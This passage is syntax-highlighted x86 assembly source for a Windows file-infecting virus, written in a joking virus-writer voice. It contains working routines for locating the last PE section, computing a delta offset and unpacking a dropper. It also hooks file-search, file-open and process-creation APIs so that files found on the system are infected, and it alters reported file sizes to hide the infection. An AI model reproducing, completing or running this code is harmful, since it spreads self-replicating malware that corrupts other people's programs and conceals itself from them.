    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get ptr to last section</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                     </span><span class="sc1">; C'mon, feel the noise...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetLastSection</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Get Delta Offset</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX = Delta Offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetDeltaOffset</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getitright</span><span class="sc0">                      </span><span class="sc1">; Oh! What is this? Incredible!</span><span class="sc0">
</span><span class="sc5">getitright</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getitright</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetDeltaOffset</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Dropper unpacker (25 bytes) &lt;&lt;-&gt;&gt; [LSCE] - Little Shitty Compression Engine</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ‹‹‹     ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ </span><span class="sc0">
</span><span class="sc1">; € €     € ‹‹‹‹€ € ‹‹‹‹€ € ‹‹‹‹€ The Little and Shitty Compression Engine</span><span class="sc0">
</span><span class="sc1">; € €‹‹‹‹ €‹‹‹‹ € € €‹‹‹‹ € ‹‹‹€‹ Poorly coded and written by...</span><span class="sc0">
</span><span class="sc1">; €‹‹‹‹‹€ €‹‹‹‹‹€ €‹‹‹‹‹€ €‹‹‹‹‹€ Who cares? :) Well... by me. Any problem?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a very simple packing engine, based in the repetition of zeros that</span><span class="sc0">
</span><span class="sc1">; the PE  files have, thus it is  able to compress a PE file... Hehehe, i can</span><span class="sc0">
</span><span class="sc1">; put a dropper without caring about  its space! That was  the only reason of</span><span class="sc0">
</span><span class="sc1">; make this little shit. Maybe one day i will make a 'real' compression engi-</span><span class="sc0">
</span><span class="sc1">; ne, but today i'm too busy :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        EDI = Offset where unpack</span><span class="sc0">
</span><span class="sc1">;        ESI = Data to unpack</span><span class="sc0">
</span><span class="sc1">;        ECX = Size of packed data</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">LSCE_UnPack</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; 2 bytes       Hehehe, i</span><span class="sc0">
</span><span class="sc5">process_byte</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;               think i'm</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte        turning a</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; 2 bytes       little bit</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">store_byte</span><span class="sc0">                      </span><span class="sc1">; 2 bytes       paranoid...</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">process_byte</span><span class="sc0">                    </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">all_unpacked</span><span class="sc0">                    </span><span class="sc1">; 2 bytes</span><span class="sc0">
</span><span class="sc5">store_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">process_byte</span><span class="sc0">                    </span><span class="sc1">; 2 bytes</span><span class="sc0">
</span><span class="sc5">all_unpacked</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; 2 bytes</span><span class="sc0">
</span><span class="sc5">LSCE_UnPack</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Hook all the possible APIs, of host IT</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">HookAllAPIs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; file modbase=file imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Hookz</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Ptr to the first API</span><span class="sc0">
</span><span class="sc5">nxtapi</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_IT</span><span class="sc0">                       </span><span class="sc1">; Get it from Import Table</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Next_IT_Struc_</span><span class="sc0">                  </span><span class="sc1">; Fail? Damn...</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Reach the end of API string</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; All must be in its place :)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Next_IT_Struc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">""</span><span class="sc0">              </span><span class="sc1">; Reach the last api? Grrr...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">AllHooked</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nxtapi</span><span class="sc0">
</span><span class="sc5">AllHooked</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Next_IT_Struc_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Next_IT_Struc</span><span class="sc0">

</span><span class="sc1">; A bard was our savior!</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[Glory to the Bards!]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Hooks' code</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">HookMoveFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_MoveFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCopyFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_CopyFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookGetFullPathNameA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_GetFullPathNameA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookDeleteFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_DeleteFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookWinExec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_WinExec</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCreateFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCreateProcessA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_CreateProcessA</span><span class="sc4">]</span><span class="sc0">       

</span><span class="sc5">HookGetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookFindFirstFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all reggies</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta Offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Return Address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FFRetAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Ptr to WFD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FF_WFD</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Remove this ret address from</span><span class="sc0">
                        </span><span class="sc1">; stack</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Call original API</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Fail? Shit...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FF_GoAway</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save reggies and flaggies</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Delta again</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_Handles_Count</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Number of active hndlers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Our Handle table in mem</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; Ptr to filename</span><span class="sc0">
</span><span class="sc5">FF_WFD</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">n_Handles</span><span class="sc0">                   </span><span class="sc1">; Over max hnd storing?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">AvoidStoring</span><span class="sc0">                    </span><span class="sc1">; Shit...</span><span class="sc0">

</span><span class="sc1">; WFD_Handles structure</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;       +00h    WFD Handle</span><span class="sc0">
</span><span class="sc1">;       +04h    Address of its WIN32_FIND_DATA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Store Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; Store WFD offset</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_Handles_Count</span><span class="sc4">]</span><span class="sc0">
      
</span><span class="sc5">AvoidStoring</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">                 </span><span class="sc1">; Is a reliable file 4 inf?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> 
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FF_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; Duh!</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Infection</span><span class="sc0">                      </span><span class="sc1">; Infect it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Info4Stealth</span><span class="sc0">                    </span><span class="sc1">; Get, if available, old file's</span><span class="sc0">
                        </span><span class="sc1">; size</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FF_AvoidInfekt</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FF_WFD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Size stealth!</span><span class="sc0">

</span><span class="sc5">FF_AvoidInfekt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">FF_GoAway</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Return to caller</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">FFRetAddress</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HookFindNextFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all reggies</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FNRetAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Search Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FN_Hnd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Call original API</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Fail? Damn.</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FN_GoAway</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save regs and flags</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; Get delta again</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; EAX = Search Handle</span><span class="sc0">
</span><span class="sc5">FN_Hnd</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidHandle</span><span class="sc0">               </span><span class="sc1">; Is in our table? If yes,</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; infect.</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ESI = Pointer to WFD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FN_FS</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">; Save if for later</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Ptr to filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check4ValidFile</span><span class="sc0">                 </span><span class="sc1">; Is reliable its inf.?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">     
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FN_AvoidInfekt</span><span class="sc0">                  </span><span class="sc1">; Duh...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Infection</span><span class="sc0">                      </span><span class="sc1">; Infect it !</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
